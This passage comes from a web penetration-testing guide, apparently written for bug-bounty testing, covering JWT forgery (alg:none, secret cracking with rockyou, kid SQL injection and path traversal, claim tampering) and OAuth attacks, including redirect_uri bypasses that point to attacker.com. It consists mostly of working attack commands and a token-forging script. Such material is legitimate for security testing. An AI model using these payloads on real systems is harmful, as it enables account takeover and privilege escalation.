+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;+/&#39;</span><span class="w"> </span><span class="s1">&#39;-_&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;=&#39;</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="c1"># eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="c1"># Encode modified payload</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;{&quot;user_id&quot;:1,&quot;role&quot;:&quot;admin&quot;}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;+/&#39;</span><span class="w"> </span><span class="s1">&#39;-_&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;=&#39;</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="c1"># Final token — empty signature (trailing dot required)</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="c1"># eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.&lt;payload&gt;.</span>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="c1"># With jwt_tool (automated):</span>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-X<span class="w"> </span>n
+</span></code></pre></div>
+<hr />
+<h3 id="233-weak-secret-brute-force">2.3.3 Weak Secret Brute-Force<a class="headerlink" href="#233-weak-secret-brute-force" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any HS256/HS384/HS512 token. If the secret is short, a common word, or a default like <code>secret</code> or <code>password</code>, it can be cracked offline and used to forge arbitrary tokens.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:3"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">hashcat (GPU)</label><label for="__tabbed_1_2">john (CPU)</label><label for="__tabbed_1_3">jwt_tool</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">hashcat_jwt.sh</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>hashcat<span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>-m<span class="w"> </span><span class="m">16500</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">  </span>&lt;jwt_token&gt;<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">  </span>/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">john_jwt.sh</span><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">  </span>--format<span class="o">=</span>HMAC-SHA256<span class="w"> </span>jwt.txt
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">jwt_tool_crack.sh</span><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-C<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="w">  </span>-d<span class="w"> </span>/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Try these manually before running hashcat:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>secret  password  key  jwt  token  admin  test  123456
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>your-256-bit-secret  your-secret-key  changeme  default
+</span></code></pre></div>
+<div class="language-python highlight"><span class="filename">forge_after_crack.py</span><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">secret</span> <span class="o">=</span> <span class="s2">&quot;cracked_secret&quot;</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">forged</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s2">&quot;user_id&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span><span class="p">},</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&quot;HS256&quot;</span><span class="p">)</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="c1"># Use in Authorization: Bearer &lt;forged&gt;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="234-kid-header-injection">2.3.4 <code>kid</code> Header Injection<a class="headerlink" href="#234-kid-header-injection" title="Permanent link">&para;</a></h3>
+<p><strong>The attack:</strong> The <code>kid</code> (key ID) header tells the server which key to use for verification. If used in a SQL query or file path without sanitization — SQL injection or path traversal — you can control which key the server uses to verify your forged token.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">SQL injection</label><label for="__tabbed_2_2">Path traversal</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">kid_sqli.sh</span><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># Inject via kid header:</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="c1"># {&quot;alg&quot;:&quot;HS256&quot;,&quot;kid&quot;:&quot;&#39; UNION SELECT &#39;attacker_secret&#39; -- -&quot;}</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="c1"># Server uses &#39;attacker_secret&#39; as signing key</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c1"># Sign token with same secret → forge arbitrary claims</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-I<span class="w"> </span>-hc<span class="w"> </span>kid<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="w">  </span>-hv<span class="w"> </span><span class="s2">&quot;&#39; UNION SELECT &#39;pwned&#39; -- -&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="w">  </span>-S<span class="w"> </span>hs256<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;pwned&quot;</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">kid_traversal.sh</span><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># {&quot;alg&quot;:&quot;HS256&quot;,&quot;kid&quot;:&quot;../../dev/null&quot;}</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="c1"># Server reads /dev/null (empty) as key</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="c1"># Sign token with empty string</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-I<span class="w"> </span>-hc<span class="w"> </span>kid<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="w">  </span>-hv<span class="w"> </span><span class="s2">&quot;../../dev/null&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="w">  </span>-S<span class="w"> </span>hs256<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h3 id="235-claim-tampering">2.3.5 Claim Tampering<a class="headerlink" href="#235-claim-tampering" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Always — test whether the server validates claims at all before doing anything complex. Many apps don't verify signatures server-side.</p>
+<div class="language-bash highlight"><span class="filename">claim_tamper.sh</span><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Tamper role (no re-signing — test if signature is validated at all)</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-I<span class="w"> </span>-pc<span class="w"> </span>role<span class="w"> </span>-pv<span class="w"> </span>admin
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="c1"># Tamper user ID</span>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-I<span class="w"> </span>-pc<span class="w"> </span>user_id<span class="w"> </span>-pv<span class="w"> </span><span class="m">1</span>
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="c1"># Expiry bypass</span>
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-I<span class="w"> </span>-pc<span class="w"> </span>exp<span class="w"> </span>-pv<span class="w"> </span><span class="m">9999999999</span>
+</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>
+</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="c1"># Tamper + test against live endpoint</span>
+</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-I<span class="w"> </span>-pc<span class="w"> </span>role<span class="w"> </span>-pv<span class="w"> </span>admin<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="w">  </span>-t<span class="w"> </span><span class="s2">&quot;https://target.com/api/admin&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="w">  </span>-rh<span class="w"> </span><span class="s2">&quot;Authorization: Bearer JWT_HERE&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a><span class="w">  </span>-S<span class="w"> </span>hs256<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;known_secret&quot;</span>
+</span></code></pre></div>
+<p><strong>Claims worth targeting:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Claim</th>
+<th>Attack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>role</code>, <code>user_role</code>, <code>is_admin</code></td>
+<td>Privilege escalation</td>
+</tr>
+<tr>
+<td><code>user_id</code>, <code>sub</code>, <code>uid</code></td>
+<td>IDOR / ATO</td>
+</tr>
+<tr>
+<td><code>email</code></td>
+<td>Account switch</td>
+</tr>
+<tr>
+<td><code>exp</code></td>
+<td>Expiry bypass</td>
+</tr>
+<tr>
+<td><code>scope</code></td>
+<td>Permission expansion</td>
+</tr>
+<tr>
+<td><code>org_id</code>, <code>tenant_id</code></td>
+<td>Tenant isolation bypass</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="236-jwt-checklist">2.3.6 JWT Checklist<a class="headerlink" href="#236-jwt-checklist" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>□ Decode and read all claims — what&#39;s in the payload?
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>□ alg:none accepted?
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>□ RS256 → HS256 confusion possible? (get public key from JWKS endpoint first)
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>□ Weak secret — hashcat + rockyou
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>□ kid header: SQL injection
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>□ kid header: path traversal
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>□ Claims validated server-side? (tamper role/id without valid signature)
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>□ exp enforced? (use expired token)
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>□ Token works across different hosts/subdomains?
+</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>□ Token in a URL anywhere? (log/referer leakage)
+</span></code></pre></div>
+<hr />
+<h2 id="24-oauth-20-flaws">2.4 OAuth 2.0 Flaws<a class="headerlink" href="#24-oauth-20-flaws" title="Permanent link">&para;</a></h2>
+<p>OAuth is the auth delegation standard powering "Login with Google/GitHub/Facebook." Its complexity — multiple flows, multiple actors, multiple redirect hops — creates a wide attack surface. OAuth bugs regularly lead to full account takeover with no user interaction beyond clicking a malicious link.</p>
+<p><strong>Quick flow recap:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>1. User clicks &quot;Login with Google&quot;
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>2. App redirects → GET /auth?client_id=X&amp;redirect_uri=https://target.com/callback&amp;state=Y
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>3. User approves → Google redirects → https://target.com/callback?code=AUTH_CODE&amp;state=Y
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>4. App exchanges: POST /token {code, client_id, client_secret}
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>5. App fetches user info with access token → logs user in
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>
+</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>Every step is an attack surface.
+</span></code></pre></div>
+<h3 id="241-redirect-uri-bypass">2.4.1 Redirect URI Bypass<a class="headerlink" href="#241-redirect-uri-bypass" title="Permanent link">&para;</a></h3>
+<p><strong>The attack:</strong> If the OAuth provider validates <code>redirect_uri</code> loosely, an attacker can redirect the authorization code to their own server — stealing it and completing the OAuth flow as the victim.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>Registered URI: https://target.com/callback
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a># Path traversal
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>https://target.com/callback/../../../attacker.com
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a># Open redirect chain
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>https://target.com/redirect?url=https://attacker.com
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a># Subdomain confusion
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>https://attacker.com.target.com/callback
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>https://target.com.attacker.com/callback
+</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>
+</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a># Parameter pollution
+</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>redirect_uri=https://target.com/callback&amp;redirect_uri=https://attacker.com
+</span><span id="__span-28-15"><a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a>
+</span><span id="__span-28-16"><a id="__codelineno-28-16" name="__codelineno-28-16" href="#__codelineno-28-16"></a># Weak prefix/suffix matching
+</span><span id="__span-28-17"><a id="__codelineno-28-17" name="__codelineno-28-17" href="#__codelineno-28-17"></a>https://target.com.evil.com/callback
+</span><span id="__span-28-18"><a id="__codelineno-28-18" name="__codelineno-28-18" href="#__codelineno-28-18"></a>https://target.com/callbackX
+</span><span id="__span-28-19"><a id="__codelineno-28-19" name="__codelineno-28-19" href="#__codelineno-28-19"></a>
+</span><span id="__span-28-20"><a id="__codelineno-28-20" name="__codelineno-28-20" href="#__codelineno-28-20"></a># Encoded characters
+</span><span id="__span-28-21"><a id="__codelineno-28-21" name="__codelineno-28-21" href="#__codelineno-28-21"></a>https://target.com%2Fattacker.com/callback
+</span><span id="__span-28-22"><a id="__codelineno-28-22" name="__codelineno-28-22" href="#__codelineno-28-22"></a>https://target.com%40attacker.com/callback
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">burp_workflow</span><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># 1. Click &quot;Login with OAuth provider&quot;</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="c1"># 2. Intercept the redirect to provider&#39;s /auth endpoint</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="c1"># 3. Modify redirect_uri using variations above</span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="c1"># 4. Set up Burp Collaborator / interactsh to receive callbacks</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="c1"># 5. If provider accepts modified URI → code arrives at your server</span>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="c1"># 6. Exchange: POST /token {code, client_id, client_secret, redirect_uri}</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="c1"># 7. Use returned token → screenshot of ATO</span>
+</span></code></pre></div>
+<hr />
+<h3 id="242-state-parameter-bypass-csrf-ato">2.4.2 State Parameter Bypass (CSRF → ATO)<a class="headerlink" href="#242-state-parameter-bypass-csrf-ato" title="Permanent link">&para;</a></h3>
+<p><strong>The attack:</strong> The <code>state</code> parameter is OAuth's CSRF token. If absent or not validated, an attacker can force-complete an OAuth flow in a victim's session — linking the attacker's OAuth identity to the victim's account.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Tests:
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>1. Remove state= entirely → does provider accept?
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>2. Intercept callback, change state value → does app verify it matches?
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>3. Reuse a state value from a previous flow → does it work again?
+</span></code></pre></div>
+<p><strong>The CSRF ATO chain:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>1. Attacker starts OAuth login → gets authorization URL with code
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>2. Stops before completing the callback step
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>3. Sends victim: target.com/callback?code=ATTACKER_CODE&amp;state=anything
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>4. Victim (logged in) visits URL → app links attacker&#39;s OAuth to victim&#39;s account
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>5. Attacker logs in via OAuth → now has victim&#39;s account
+</span></code></pre></div>
+<hr />
+<h3 id="243-authorization-code-interception">2.4.3 Authorization Code Interception<a class="headerlink" href="#243-authorization-code-interception" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>1. Referer leakage
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>   → Callback page loads third-party resources
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>   → DevTools → Network → check Referer headers on any third-party requests
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>   → If Referer contains ?code= → code is leaking
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>2. Open redirect chains with code
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>   → target.com/callback?code=X redirects to external URL
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>   → Code appears in Referer of that redirect
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a>
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>3. Code reuse
+</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>   → Capture a valid code, use it, try using it again
+</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>   → Second use succeeds → codes not invalidated on use
+</span></code></pre></div>
+<hr />
+<h3 id="244-account-takeover-via-oauth-mislink">2.4.4 Account Takeover via OAuth Mislink<a class="headerlink" href="#244-account-takeover-via-oauth-mislink" title="Permanent link">&para;</a></h3>
+<p><strong>The attack:</strong> When an app creates/links accounts based on email from the OAuth provider without verifying ownership of that email, an attacker can pre-register a victim's email to hijack their future OAuth login.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>1. Register on target.com with victim@gmail.com (no email verification)
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>2. Victim clicks &quot;Login with Google&quot; using victim@gmail.com
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>3. App sees email match → links or merges accounts
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>4. Attacker controls the account
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>Test both directions:
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>- Register first → OAuth login with same email
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>- OAuth login first → register with same email
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>- Link social account to existing account (is ownership verified?)
+</span></code></pre></div>
+<div class="admonition danger">
+<p class="admonition-title">Highest-impact OAuth bug, most overlooked</p>
+<p>Test this on any app with both password login and social login. The fix requires verifying email ownership — many apps skip this entirely.</p>
+</div>
+<hr />
+<h3 id="245-oauth-checklist">2.4.5 OAuth Checklist<a class="headerlink" href="#245-oauth-checklist" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>□ redirect_uri strict validation? All bypass patterns from 2.4.1
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>□ state present and validated on callback?
